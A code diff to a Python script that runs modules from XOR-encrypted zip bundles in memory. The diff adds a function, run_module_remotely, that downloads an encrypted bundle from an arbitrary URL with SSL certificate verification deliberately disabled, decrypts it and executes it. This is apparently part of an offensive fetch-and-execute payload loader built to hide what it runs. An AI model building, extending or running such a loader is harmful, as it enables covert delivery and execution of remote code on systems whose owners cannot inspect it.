@@ -5,6 +5,8 @@ import sys
 import io
 import json
 import shlex
+import urllib.request
+import ssl
 
 class ZipImportError(ImportError):
     """Exception raised by zipimporter objects."""
@@ -129,12 +131,27 @@ def encrypt_decrypt(input_data, key, cipher='xor'):
         key_len = len(key)
         return bytes([b ^ key[i % key_len] for i, b in enumerate(input_data)])
 
-
 def run_module_locally(enc_zip_path, key, module_args):
     #decrypt
     with open(enc_zip_path, "rb") as file:
         zip_content = encrypt_decrypt(file.read(), key)
     
+    run_module(zip_content, module_args)
+
+def run_module_remotely(url, key, module_args):
+    #decrypt
+    #with open(enc_zip_path, "rb") as file:
+        #zip_content = encrypt_decrypt(file.read(), key)
+    
+    # print(f'[*] Downloading the bundle from: {url}')
+    # response = requests.get(url, verify=False)
+
+    # Create a context to bypass SSL verification
+    context = ssl._create_unverified_context()
+    with urllib.request.urlopen(url, context=context) as response:
+        file_data = response.read()
+
+    zip_content = encrypt_decrypt(file_data, key)
     run_module(zip_content, module_args)
 
 def run_module(enc_zip_conent,  module_args):
